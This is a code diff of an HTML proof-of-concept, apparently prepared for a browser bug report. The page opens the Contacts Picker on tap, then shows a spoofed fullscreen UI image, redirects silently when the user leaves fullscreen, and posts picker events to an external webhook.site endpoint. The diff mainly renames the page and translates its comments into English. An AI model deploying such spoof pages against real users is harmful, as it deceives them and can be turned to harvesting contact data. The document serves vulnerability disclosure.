@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Contacts Picker → Fullscreen UI Spoof PoC</title>
+  <title>Contacts Picker Post-Permission UI PoC</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
@@ -42,13 +42,15 @@
 <img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
-  <h1>Tap anywhere to start demo</h1>
+  <h1>Tap anywhere to open Contacts Picker</h1>
 </div>
 
 <script>
-/**
- * Webhook ONLY for Contacts Picker lifecycle
- * No fullscreen / visibility / redirect logging
+/*
+ * FINAL PoC
+ * - Webhook fires ONLY during Contacts Picker lifecycle
+ * - No fullscreen / visibility / redirect telemetry
+ * - Contact data intentionally not collected
  */
 
 const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";
@@ -58,7 +60,7 @@ function send(event, data = {}) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      timestamp: new Date().toISOString(),
+      time: new Date().toISOString(),
       event,
       ...data
     })
@@ -67,7 +69,7 @@ function send(event, data = {}) {
 
 document.addEventListener("click", async () => {
 
-  // ✅ REQUEST #1 — picker dipanggil
+  // ✅ REQUEST #1 — Contacts Picker invoked
   send("contacts_picker_called", {
     requested_fields: ["name", "tel", "email"]
   });
@@ -83,7 +85,7 @@ document.addEventListener("click", async () => {
 
       granted = result && result.length > 0;
 
-      // ✅ REQUEST #2 — hasil picker
+      // ✅ REQUEST #2 — Picker result
       send("contacts_picker_result", {
         granted,
         payload_shape: granted ? {
@@ -106,20 +108,20 @@ document.addEventListener("click", async () => {
     });
   }
 
-  // ⛔ Tidak kirim webhook di bawah ini
+  /* ---- NO MORE NETWORK REQUESTS BELOW ---- */
 
-  // UI spoof
-  document.getElementById("spoof").style.display = "block";
+  // Replace UI
   document.getElementById("content").style.display = "none";
+  document.getElementById("spoof").style.display = "block";
 
-  // fullscreen tetap jalan, tapi silent
+  // Enter fullscreen using same user activation
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
 
 }, { once: true });
 
-// fullscreen exit → redirect (silent)
+// Silent fullscreen exit → redirect
 document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
     setTimeout(() => {
